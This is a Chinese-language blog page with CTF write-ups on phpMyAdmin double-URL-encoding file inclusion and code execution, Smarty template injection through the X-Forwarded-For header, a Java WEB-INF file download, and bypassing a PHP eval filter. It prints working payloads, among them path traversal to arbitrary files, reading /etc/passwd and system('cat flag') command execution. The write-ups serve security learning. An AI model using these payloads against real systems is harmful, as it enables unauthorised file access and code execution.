class="line">        &#x27;server_status.php&#x27;,</span><br><span class="line">        &#x27;server_status_advisor.php&#x27;,</span><br><span class="line">        &#x27;server_status_monitor.php&#x27;,</span><br><span class="line">        &#x27;server_status_queries.php&#x27;,</span><br><span class="line">        &#x27;server_status_variables.php&#x27;,</span><br><span class="line">        &#x27;server_variables.php&#x27;,</span><br><span class="line">        &#x27;sql.php&#x27;,</span><br><span class="line">        &#x27;tbl_addfield.php&#x27;,</span><br><span class="line">        &#x27;tbl_change.php&#x27;,</span><br><span class="line">        &#x27;tbl_create.php&#x27;,</span><br><span class="line">        &#x27;tbl_import.php&#x27;,</span><br><span class="line">        &#x27;tbl_indexes.php&#x27;,</span><br><span class="line">        &#x27;tbl_sql.php&#x27;,</span><br><span class="line">        &#x27;tbl_export.php&#x27;,</span><br><span class="line">        &#x27;tbl_operations.php&#x27;,</span><br><span class="line">        &#x27;tbl_structure.php&#x27;,</span><br><span class="line">        &#x27;tbl_relation.php&#x27;,</span><br><span class="line">        &#x27;tbl_replace.php&#x27;,</span><br><span class="line">        &#x27;tbl_row_action.php&#x27;,</span><br><span class="line">        &#x27;tbl_select.php&#x27;,</span><br><span class="line">        &#x27;tbl_zoom_select.php&#x27;,</span><br><span class="line">        &#x27;transformation_overview.php&#x27;,</span><br><span class="line">        &#x27;transformation_wrapper.php&#x27;,</span><br><span class="line">        &#x27;user_password.php&#x27;,</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>mb_strpos</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">格式：mb_strpos ( string $haystack , string $needle [, int $offset = 0 [, string $encoding = mb_internal_encoding() ]] )</span><br><span class="line"></span><br><span class="line">含义：int查找 string 在一个 string 中首次出现的位置。基于字符数执行一个多字节安全的 strpos() 操作。 第一个字符的位置是 0，第二个字符的位置是 1，以此类推</span><br></pre></td></tr></table></figure>

<p>$_page是取出$page问号前的东西，是考虑到target有参数的情况的话，只要$_page在白名单里面就会返回ture，所以如果第一个步骤不成功的话，还会进行一次url解码，再次进行相同的判断</p>
<p>由于服务器会自动进行一次url解码，所以我们传入二次编码后，会触发checkPageValidity()函数中url解码后的判断，判断问号前面的文件是否在白名单中，在的话返回true,因此构造payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一开始：?index.php?target=db_dataict.php%253f/../../../文件名</span><br><span class="line"></span><br><span class="line">服务器url解码后：?index.php?target=db_dataict.php%3f/../../../文件名</span><br><span class="line"></span><br><span class="line">checkPageValidity()函数里的url解码后·：?index.php?target=db_dataict.php?/../../../文件名</span><br></pre></td></tr></table></figure>
<p>但是在index.php中$_REQUEST[‘target’]仍然是db_datadict.php%3f，而且会被include，通过目录穿越，造成任意文件包含</p>
<h2 id="任意文件包含"><a href="#任意文件包含" class="headerlink" title="任意文件包含"></a>任意文件包含</h2><h3 id="通过目录穿越看系统目录下的文件"><a href="#通过目录穿越看系统目录下的文件" class="headerlink" title="通过目录穿越看系统目录下的文件"></a>通过目录穿越看系统目录下的文件</h3><p>构造payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?target=db_datadict.php%253f/../../../文件名</span><br></pre></td></tr></table></figure>
<p>其中../的数量看实际情况</p>
<h2 id="任意代码执行"><a href="#任意代码执行" class="headerlink" title="任意代码执行"></a>任意代码执行</h2><h3 id="包含数据库中的文件-include包含文件，如果文件是php文件的话，则会执行，如果不是，则会返回文件中的内容）"><a href="#包含数据库中的文件-include包含文件，如果文件是php文件的话，则会执行，如果不是，则会返回文件中的内容）" class="headerlink" title="包含数据库中的文件(include包含文件，如果文件是php文件的话，则会执行，如果不是，则会返回文件中的内容）"></a>包含数据库中的文件(include包含文件，如果文件是php文件的话，则会执行，如果不是，则会返回文件中的内容）</h3><p>先查一下数据库的路径：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &quot;%datadir%&quot;</span><br></pre></td></tr></table></figure>
<p>而后创建数据库及库中的表及表中的字段内容，内容可以为php代码，之后构造payload进行文件包含，并执行恶意代码</p>
<h3 id="包含session文件"><a href="#包含session文件" class="headerlink" title="包含session文件"></a>包含session文件</h3><p>session文件路径以实际为主<br>构造sql语句并夹杂恶意代码，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;php代码&quot;</span><br></pre></td></tr></table></figure>
<p>而后可以使用火狐的web开发者工具中的存储选项中的cookie值中phpmyadmin中的value值，这是生成的session文件名，一般存储位置为上面的数据库路径中的mysql/data改为tmp/tmp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?target=db_datadict.php%253f/../../../按实际情况定/按实际情况定/tmp/tmp/sess_cookie中的phpmyadmin中的value值</span><br></pre></td></tr></table></figure>
<p>而其中../以实际为主，要一个一个试</p>
<p>详细请看：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/leixiao-/p/10265150.html#autoid-1-0-0">https://www.cnblogs.com/leixiao-/p/10265150.html#autoid-1-0-0</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SSTI/" rel="tag">SSTI</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-smart模板漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/08/31/smart%E6%A8%A1%E6%9D%BF%E6%BC%8F%E6%B4%9E/" class="article-date">
  	<time datetime="2021-08-30T16:00:00.000Z" itemprop="datePublished">2021-08-31</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/08/31/smart%E6%A8%A1%E6%9D%BF%E6%BC%8F%E6%B4%9E/">
        smarty模板漏洞
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="smarty模板漏洞"><a href="#smarty模板漏洞" class="headerlink" title="smarty模板漏洞"></a>smarty模板漏洞</h1><p>打开主页，我们观察了各页面的内容，其中Your ip:让我们产生怀疑，会不会是SSTI漏洞，我们抓取一个包，然后构造X-Forwarded-For或client-ip这两个字段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X-Foewarded-For: &#123;7*7&#125;</span><br><span class="line"></span><br><span class="line">client-ip: &#123;7*7&#125;</span><br></pre></td></tr></table></figure>
<p>发现Your ip:会显示49，证明存在SSTI，而读取XFF和client-ip的api有些是使用smart引擎写的，因此我们可以猜测是smart模板漏洞，而常见是flask模板漏洞</p>
<p>而smarty模板是基于PHP开发的，与flask模板有比较大的区别，我们可以使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$smarty.version&#125;</span><br></pre></td></tr></table></figure>
<p>来确定smarty模板的版本</p>
<h2 id="常见的利用方法"><a href="#常见的利用方法" class="headerlink" title="常见的利用方法"></a>常见的利用方法</h2><h3 id="php-php"><a href="#php-php" class="headerlink" title="{php}{/php}"></a>{php}{/php}</h3><p>smarty模板支持使用的{php}{/php}标签来执行被包裹的php指令，但在smart3版本中已经废弃了{php}{/php}标签，但是在smarty3.1中的smartyBC中仍然可以使用</p>
<h3 id="literal"><a href="#literal" class="headerlink" title="{literal}"></a>{literal}</h3><p>{literal}可以让一个模板区域的字符原样输出，这经常保护页面上的javascript或css样本表，避免因为smarty的定界符错被解析</p>
<p>对于php5的话，可以使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt; phpinfo();&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>来实现php代码的执行</p>
<h3 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h3><p>通过self来获取smarty类的静态方法来实现文件读写<br>smarty类中的getStreamVariable方法的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public function getStreamVariable($variable)&#123; $_result = &#x27;&#x27;; $fp = fopen($variable, &#x27;r+&#x27;); if ($fp) &#123; while (!feof($fp) &amp;&amp; ($current_line = fgets($fp)) !== false) &#123; $_result .= $current_line; &#125; fclose($fp); return $_result; &#125; $smarty = isset($this-&gt;smarty) ? $this-&gt;smarty : $this; if ($smarty-&gt;error_unassigned) &#123; throw new SmartyException(&#x27;Undefined stream variable &quot;&#x27; . $variable . &#x27;&quot;&#x27;); &#125; else &#123; return null; &#125; &#125;</span><br></pre></td></tr></table></figure>

<p>getStreamVariable()方法是读取一个文件并返回其内容，所以我们可以用self来获取smarty类对象并调用这个方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:///etc/passwd&quot;)&#125;</span><br></pre></td></tr></table></figure>
<p>但这是旧版本的smarty模板的利用方法，新版本不能用，而smarty3.1.30版本开始，这个方法已经被删除，而Smarty_Internal_File类中的writeFile方法来写shell也已经被高版本删除</p>
<h3 id="if"><a href="#if" class="headerlink" title="{if}"></a>{if}</h3><p>smarty模板的{if}标签和php的if很像，只是增加了一些特性，每个{if}要配备一个{/if}，也可以匹配{else}和{elseif}，全部的php条件表达式和函数都可以在if内使用，如or,and等</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>
<p>即可显示php版本</p>
<p>回到题目本身，我可以在bp抓的包中构造XFF或client-ip来获取flag或想要的信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;if system(&quot;cat flag&quot;)&#125;&#123;/if&#125;</span><br><span class="line"></span><br><span class="line">client-ip: &#123;if system(&quot;cat flag&quot;)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>

<p>详细请看：<a target="_blank" rel="noopener" href="https://www.freebuf.com/column/219913.html">https://www.freebuf.com/column/219913.html</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SSTI/" rel="tag">SSTI</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-java的WEB-INF" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/08/30/java%E7%9A%84WEB-INF/" class="article-date">
  	<time datetime="2021-08-29T16:00:00.000Z" itemprop="datePublished">2021-08-30</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/08/30/java%E7%9A%84WEB-INF/">
        java的WEB-INF
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="java的WEB-INF文件"><a href="#java的WEB-INF文件" class="headerlink" title="java的WEB-INF文件"></a>java的WEB-INF文件</h1><p>我们点击help，出现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.io.FileNotFoundException:&#123;help.docx&#125;</span><br></pre></td></tr></table></figure>
<p>而且payload为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://url/Download?filename=文件名</span><br></pre></td></tr></table></figure>
<p>可见可能是文件包含，可以用此下载文件，不过用get提交的方式不可以，所以此处我们可以试一下post提交，发现可以下载help.docx文件，而且用bp抓包，放到repeater后改为post提交，可以看见500状态码，即服务器内部出错，并爆出一些关键信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 500 – Internal Server Error&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;h1 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;&#125; h2 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;&#125; h3 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;&#125; body &#123;font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;&#125; b &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;&#125; p &#123;font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;&#125; a &#123;color:black;&#125; a.name &#123;color:black;&#125; .line &#123;height:1px;background-color:#525D76;border:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 500 – Internal Server Error&lt;/h1&gt;&lt;hr class=&quot;line&quot; /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Exception Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The server encountered an unexpected condition that prevented it from fulfilling the request.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Exception&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;java.lang.NullPointerException</span><br><span class="line">	java.io.FileInputStream.&amp;lt;init&amp;gt;(FileInputStream.java:130)</span><br><span class="line">	java.io.FileInputStream.&amp;lt;init&amp;gt;(FileInputStream.java:93)</span><br><span class="line">	com.wm.ctf.DownloadController.doPost(DownloadController.java:24)</span><br><span class="line">	javax.servlet.http.HttpServlet.service(HttpServlet.java:661)</span><br><span class="line">	javax.servlet.http.HttpServlet.service(HttpServlet.java:742)</span><br><span class="line">	org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)</span><br><span class="line">&lt;/pre&gt;&lt;p&gt;&lt;b&gt;Note&lt;/b&gt; The full stack trace of the root cause is available in the server logs.&lt;/p&gt;&lt;hr class=&quot;line&quot; /&gt;&lt;h3&gt;Apache Tomcat/8.5.24&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>其中我们可以看见</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.wm.ctf.DownloadController.doPost(DownloadController.java:24)</span><br></pre></td></tr></table></figure>
<p>而一般我们出于安全的考虑，我们会将网页放在WEB-INF文件下，防止页面被直接访问，而要访问WEB-INF文件下的网页，在WEB-INF文件下设置web.xml文件，其中web.xml的格式为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--直接设置 welcome-file 节点--&gt;</span><br><span class="line">&lt;welcome-file&gt; ./WEB-INF/views/xxx.jsp&lt;/weclome-file&gt;</span><br></pre></td></tr></table></figure>
<p>访问地址为：<a target="_blank" rel="noopener" href="http://url/xxx/%EF%BC%88xxx%E4%B8%BA%E9%A1%B9%E7%9B%AE%E5%90%8D%EF%BC%89">http://url/xxx/（xxx为项目名）</a></p>
<p>因此，我们可以包含web.xml文件，即将help.docx改为web.xml进行post提交即可下载web.xml</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot; version=&quot;4.0&quot;&gt;</span><br><span class="line">&lt;welcome-file-list&gt;</span><br><span class="line">&lt;welcome-file&gt;Index&lt;/welcome-file&gt;</span><br><span class="line">&lt;/welcome-file-list&gt;</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">&lt;servlet-name&gt;IndexController&lt;/servlet-name&gt;</span><br><span class="line">&lt;servlet-class&gt;com.wm.ctf.IndexController&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">&lt;servlet-name&gt;IndexController&lt;/servlet-name&gt;</span><br><span class="line">&lt;url-pattern&gt;/Index&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">&lt;servlet-name&gt;LoginController&lt;/servlet-name&gt;</span><br><span class="line">&lt;servlet-class&gt;com.wm.ctf.LoginController&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">&lt;servlet-name&gt;LoginController&lt;/servlet-name&gt;</span><br><span class="line">&lt;url-pattern&gt;/Login&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">&lt;servlet-name&gt;DownloadController&lt;/servlet-name&gt;</span><br><span class="line">&lt;servlet-class&gt;com.wm.ctf.DownloadController&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">&lt;servlet-name&gt;DownloadController&lt;/servlet-name&gt;</span><br><span class="line">&lt;url-pattern&gt;/Download&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">&lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">&lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">&lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">&lt;url-pattern&gt;/Flag&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure>
<p>通过看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;</span><br></pre></td></tr></table></figure>
<p>可知FlagController.class文件放在WEB-INF/classes/com/wm/ctf/中</p>
<p>WEB-INF主要包含的文件和目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则</span><br><span class="line">/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">/WEB-INF/database.properties：数据库配置文件</span><br><span class="line">漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</span><br></pre></td></tr></table></figure>

<p>所以可以和上面一样，包含FlagController.class文件，因此构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=/WEB-INF/classes/com/wm/ctf/FlagController.class</span><br></pre></td></tr></table></figure>
<p>即可得到，里面的base64的码就是flag</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/" rel="tag">java</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-搜索读取文件的php函数的应用" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/08/30/%E6%90%9C%E7%B4%A2%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84php%E5%87%BD%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/" class="article-date">
  	<time datetime="2021-08-29T16:00:00.000Z" itemprop="datePublished">2021-08-30</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/08/30/%E6%90%9C%E7%B4%A2%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84php%E5%87%BD%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/">
        搜索读取文件的php函数的应用
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="搜索读取文件的php函数的应用"><a href="#搜索读取文件的php函数的应用" class="headerlink" title="搜索读取文件的php函数的应用"></a>搜索读取文件的php函数的应用</h1><p>打开页面，尝试各种泄露的可能，用GitHack.py发现是.git文件泄露，因此构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http://url/.git/</span><br></pre></td></tr></table></figure>
<p>获取源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#x27;exp&#x27;]))&#123;</span><br><span class="line">    if (!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">            if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">                // echo $_GET[&#x27;exp&#x27;];</span><br><span class="line">                @eval($_GET[&#x27;exp&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>通过看到eval()这个危险函数，我们可以构造一些恶意代码来读取，但是它过滤掉了一些伪协议和一些函数，但是我们可以先构造一个exp，在本地尝试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">print_r(scandir(&quot;.&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>来读取当前目录下的文件，如果“.”改为“\”,会读取系统下目录的文件，我们也可以使用localeconv()函数返回一包含本地数字及货币格式信息的数组，而构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(scandir(localeconv()));</span><br></pre></td></tr></table></figure>
<p>可以看到第一个数组为“.”，因此，我们可以使用current()函数或pos()函数来默认读取返回数组中的当前单元，默认取第一个值。构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(scandir(current(localconv())));</span><br></pre></td></tr></table></figure>
<p>发现里面有flag.php，此时我们可以使用array_reverse()函数来颠倒数组中元素的顺序，而后用next()读取数组中的第二个元素，构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(next(array_reverse(scandir(localconv()))));</span><br></pre></td></tr></table></figure>
<p>而后我们可以用readfile()函数或hightlight_file()函数或show_source()函数来读取文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(next(array_reverse(scandir(localeconv()))));</span><br></pre></td></tr></table></figure>
<p>当然也可以用array_file()来调换键和值的位置，然后用array_rand()读取键值，不断刷新不断随机返回</p>
<p>同时我们也可以使用PHPSESSID来解题，因为flag.php文件里的字符是由PHPSESSID来支持的，但是在使用session前要通过session_start()来告诉php我要使用session，因为php默认不主动使用session，而session_id()可以获取当前的session id</p>
<p>使用方法，我们要手动设置名为PHPSESSID的cookie，并设置值为flag.php，而后构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(session_id(session_start());</span><br></pre></td></tr></table></figure>
<p>可返回flag.php</p>
<p>而后和上面一样，用readfile()函数或hightlight_file()函数或show_source()函数来读取文件，要手动设置名为PHPSESSID的cookie，并设置值为flag.php，而后构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(session_id(session_start());</span><br></pre></td></tr></table></figure>
<p>读取flag.php的内容</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/4/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/6/">Next &amp;raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2021 John Doe
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




<script type="text/x-mathjax-config">
MathJax.Hub.Config({
